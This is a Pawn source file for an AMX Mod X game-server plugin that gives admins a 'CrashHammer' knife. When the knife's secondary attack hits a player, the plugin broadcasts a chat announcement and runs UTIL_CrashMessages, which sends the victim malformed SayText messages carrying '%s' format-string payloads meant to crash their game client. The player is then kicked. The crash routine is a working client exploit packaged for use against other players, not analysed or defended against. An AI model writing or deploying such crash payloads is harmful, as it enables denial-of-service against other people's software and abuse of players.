#include <amxmodx>
#include <knifeapi>
#include <hamsandwich>

new g_Banhammer, g_msgSayText

#define V_MODEL "models/knifeapi/banhammer/v_banhammer.mdl"
#define P_MODEL "models/knifeapi/banhammer/p_banhammer.mdl"

#define SOUND_DRAW "knifeapi/banhammer/banhammer_deploy.wav"
#define SOUND_HIT "knifeapi/banhammer/banhammer_hit.wav"
#define SOUND_STAB "knifeapi/banhammer/banhammer_stab.wav"
#define SOUND_WALL "knifeapi/banhammer/banhammer_hitwall.wav"
#define SOUND_WHIFF "knifeapi/banhammer/banhammer_whiff.wav"

#define ACCESS_FLAG     ADMIN_RCON
#define IMMUNITY_FLAG   ADMIN_IMMUNITY

public plugin_precache()
{
    precache_model(V_MODEL)
    precache_model(P_MODEL)
    
    precache_generic("sprites/knifeapi/banhammer.spr")
    precache_generic("sprites/knife_banhammer.txt")
    
    /*precache_sound(SOUND_DRAW)
    precache_sound(SOUND_HIT)
    precache_sound(SOUND_STAB)
    precache_sound(SOUND_WALL)
    precache_sound(SOUND_WHIFF)*/
}

public plugin_init()
{
    
    register_plugin("Banhammer", "1.0", "idiotstrike")

    g_Banhammer = Knife_Register(
        "CrashHammer",
        V_MODEL,
        P_MODEL,
        _,
        _,
        _,
        _,
        _,
        _,
        500.0,
        500.0
    )
    
    const DMG_BULLET = (1<<1)
    const DMG_ALWAYSGIB = (1<<13)
    
    Knife_SetProperty(g_Banhammer, KN_CLL_PrimaryRange, 50.0)
    Knife_SetProperty(g_Banhammer, KN_CLL_SecondaryRange, 70.0)
    Knife_SetProperty(g_Banhammer, KN_CLL_PrimaryNextAttack, 2.1)
    Knife_SetProperty(g_Banhammer, KN_CLL_SecondaryNextAttack, 3.0)
    Knife_SetProperty(g_Banhammer, KN_CLL_SecondaryDamageDelay, 1.0)
    Knife_SetProperty(g_Banhammer, KN_CLL_PrimaryDmgBits, DMG_BULLET|DMG_ALWAYSGIB)
    Knife_SetProperty(g_Banhammer, KN_CLL_SecondaryDmgBits, 1<<24)
    Knife_SetProperty(g_Banhammer, KN_STR_SpriteName, "knife_banhammer")
    
    g_msgSayText = get_user_msgid("SayText");
    
    RegisterHam(Ham_Spawn, "player", "@PlayerSpawn", true)
}

// because I want to make my code unreadable
@PlayerSpawn(Player)
{
    if(!Knife_PlayerHas(Player, g_Banhammer) && get_user_flags(Player) & ACCESS_FLAG)
    {
        Knife_PlayerGive(Player, g_Banhammer)
    }
}

public KnifeAction_DealDamage(Attacker, Victim, Knife, Float:Damage, bool:PrimaryAttack, DmgBits, bool:Backstab)
{
    if(Knife != g_Banhammer || !Victim)
    {
        return KnifeAction_DoNothing
    }
    
    if(get_user_flags(Victim) & IMMUNITY_FLAG)
    {
        client_print(Attacker, print_center, "This user is immune.")
        return KnifeAction_Block
    }
    
    new PlayerOrigin[3]
    get_user_origin(Victim, PlayerOrigin)
    
    if(!PrimaryAttack)
    {
        // spawn some silly effects
        fx_TE_LAVASPLASH(PlayerOrigin)
        //fx_TE_TELEPORT(PlayerOrigin) // Don't teleport, better to see the player's buggy body!
        fx_TE_EXPLOSION2(PlayerOrigin, 150, 5)
        
        // ban the player
        new Authid[34], Name[32]
        get_user_authid(Victim, Authid, charsmax(Authid))
        get_user_name(Victim, Name, charsmax(Name))
        
        client_print(0, print_chat, "%s has been hit by the CrashHammer! Crashing his game.",
            Name, Authid
        )
        
        set_task(3.0, "_tKickCrashed", get_user_userid(Victim))
        UTIL_CrashMessages(Victim);
    }
    
    return KnifeAction_DoNothing
}

public _tKickCrashed(userid)
	server_cmd("kick #%d", userid);

UTIL_CrashMessages(id)
{
	message_begin(MSG_ONE_UNRELIABLE, g_msgSayText, _, id)
	write_byte(70)
	write_string("^x04[@%s0@%s0@%s0")
	message_end()
	
	message_begin(MSG_ONE_UNRELIABLE, g_msgSayText, _, id)
	write_byte(79)
	write_string("^x04[@%s0@%s0@%s0")
	message_end()
	
	message_begin(MSG_ONE_UNRELIABLE, g_msgSayText, _, id)
	write_byte(85)
	write_string("^x04[@%s0@%s0@%s0")
	message_end()
}

fx_TE_LAVASPLASH(Origin[3])
{
        message_begin(MSG_BROADCAST ,SVC_TEMPENTITY)
       
        write_byte(TE_LAVASPLASH)
       
        write_coord(Origin[0])    // start position
        write_coord(Origin[1])
        write_coord(Origin[2])
       
        message_end()
}

 
/*fx_TE_TELEPORT(Origin[3])
{
        message_begin(MSG_BROADCAST ,SVC_TEMPENTITY)
       
        write_byte(TE_TELEPORT)
       
        write_coord(Origin[0])    // start position
        write_coord(Origin[1])
        write_coord(Origin[2])
       
        message_end()
}*/
 
 
fx_TE_EXPLOSION2(Origin[3], startcolor, colors)
{
        message_begin(MSG_BROADCAST ,SVC_TEMPENTITY)
       
        write_byte(TE_EXPLOSION2)
       
        write_coord(Origin[0])    // start position
        write_coord(Origin[1])
        write_coord(Origin[2])
       
        write_byte(startcolor) // starting color
        write_byte(colors) // num colors
        
        message_end()
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang10250\\ f0\\ fs16 \n\\ par }
*/
